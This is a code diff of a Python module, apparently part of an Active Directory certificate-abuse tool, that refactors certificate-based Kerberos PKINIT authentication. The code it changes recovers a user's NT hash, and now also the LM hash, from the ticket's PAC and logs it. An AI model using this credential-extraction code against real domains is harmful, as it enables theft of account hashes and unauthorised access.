@@ -2,7 +2,7 @@ import datetime
 import logging
 import socket
 from random import getrandbits
-from typing import Tuple
+from typing import Union
 
 from asn1crypto import cms, core
 from impacket.dcerpc.v5.rpcrt import TypeSerialization1
@@ -34,10 +34,11 @@ from pyasn1.codec.der import decoder, encoder
 from pyasn1.type.univ import noValue
 
 from .certificate import (
-    get_id_from_certificate,
+    get_identifications_from_certificate,
     get_object_sid_from_certificate,
     hash_digest,
     hashes,
+    cert_id_to_parts,
 )
 from .pkinit import PA_PK_AS_REP, Enctype, KDCDHKeyInfo, build_pkinit_as_req
 
@@ -58,28 +59,6 @@ def truncate_key(value: bytes, keysize: int) -> bytes:
     return output
 
 
-def cert_id_to_parts(id_type: str, identification: str) -> Tuple[str, str]:
-    if id_type == "DNS Host Name":
-        parts = identification.split(".")
-        if len(parts) == 1:
-            cert_username = identification
-            cert_domain = ""
-        else:
-            cert_username = parts[0] + "$"
-            cert_domain = ".".join(parts[1:])
-    elif id_type == "UPN":
-        parts = identification.split("@")
-        if len(parts) == 1:
-            cert_username = identification
-            cert_domain = ""
-        else:
-            cert_username = "@".join(parts[:-1])
-            cert_domain = parts[-1]
-    else:
-        return (None, None)
-    return (cert_username, cert_domain)
-
-
 class Authenticate:
     def __init__(self, tracker, dc_domain, dc_ip, user, no_ccache, no_hash):
         self.tracker = tracker
@@ -90,16 +69,28 @@ class Authenticate:
         self.key = user.privatekey
         self.no_ccache = no_ccache
         self.no_hash = no_hash
+        self.lm_hash = None
         self.nt_hash = None
 
     def authenticate(self, is_key_credential=False):
         username = self.user.name
         domain = self.user.domain
 
+        id_type = None
+        identification = None
+        object_sid = None
         if not is_key_credential:
-            id_type, identification = get_id_from_certificate(self.cert)
+            identifications = get_identifications_from_certificate(self.cert)
+
+            # Take the first identification automatically, needs improvements
+            if len(identifications) != 0:
+                id_type, identification = identifications[0]
+            else:
+                id_type, identification = None, None
+
+            cert_username, cert_domain = cert_id_to_parts([(id_type, identification)])
+
             object_sid = get_object_sid_from_certificate(self.cert)
-            cert_username, cert_domain = cert_id_to_parts(id_type, identification)
 
             if not any([cert_username, cert_domain]):
                 logger.warn("Could not find identification in the provided certificate")
@@ -151,8 +142,6 @@ class Authenticate:
             self.tracker.last_error_msg = err_msg
             return False
 
-        username = username.lower()
-
         if not self.dc_ip:
             try:
                 self.dc_ip = socket.gethostbyname(domain)
@@ -165,11 +154,35 @@ class Authenticate:
                     self.tracker.last_error_msg = err_msg
                     return False
 
+        domain = domain.lower()
+        username = username.lower()
+        upn = "%s@%s" % (username, domain)
+
+        return self.kerberos_authentication(
+            username,
+            domain,
+            is_key_credential,
+            id_type,
+            identification,
+            object_sid,
+            upn,
+        )
+
+    def kerberos_authentication(
+        self,
+        username: str = None,
+        domain: str = None,
+        is_key_credential: bool = False,
+        id_type: str = None,
+        identification: str = None,
+        object_sid: str = None,
+        upn: str = None,
+    ) -> Union[str, bool]:
         as_req, diffie = build_pkinit_as_req(username, domain, self.key, self.cert)
 
         try:
             logger.debug(f"Getting a TGT via the following KDC IP: {self.dc_ip}")
-            tgt = sendReceive(encoder.encode(as_req), domain, self.dc_ip)
+            tgt = sendReceive(as_req, domain, self.dc_ip)
         except KerberosError as e:
             if "KDC_ERR_CLIENT_NAME_MISMATCH" in str(e) and not is_key_credential:
                 err_msg = f"Name mismatch between certificate and user {repr(username)}"
@@ -346,10 +359,7 @@ class Authenticate:
             seq_set_iter(
                 req_body,
                 "etype",
-                (
-                    int(cipher.enctype),
-                    int(constants.EncryptionTypes.rc4_hmac.value),
-                ),
+                (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)),
             )
 
             ticket = ticket.to_asn1(TicketAsn1())
@@ -377,6 +387,8 @@ class Authenticate:
             buff = pac_type["Buffers"]
 
             nt_hash = None
+            lm_hash = "aad3b435b51404eeaad3b435b51404ee"
+
             for _ in range(pac_type["cBuffers"]):
                 info_buffer = PAC_INFO_BUFFER(buff)
                 data = pac_type["Buffers"][info_buffer["Offset"] - 8 :][
@@ -395,6 +407,8 @@ class Authenticate:
                         cred_structs = NTLM_SUPPLEMENTAL_CREDENTIAL(
                             b"".join(cred["Credentials"])
                         )
+                        if any(cred_structs["LmPassword"]):
+                            lm_hash = cred_structs["LmPassword"].hex()
                         nt_hash = cred_structs["NtPassword"].hex()
                         break
                     break
@@ -406,12 +420,14 @@ class Authenticate:
                 self.tracker.last_error_msg = err_msg
                 return False
 
+            self.lm_hash = lm_hash
             self.nt_hash = nt_hash
 
             if not is_key_credential:
                 logger.result(
                     f"Gathered NT hash for the user '{domain}\{username}': {nt_hash}"
                 )
+                self.user.lm_hash = lm_hash
                 self.user.nt_hash = nt_hash
             return True
 
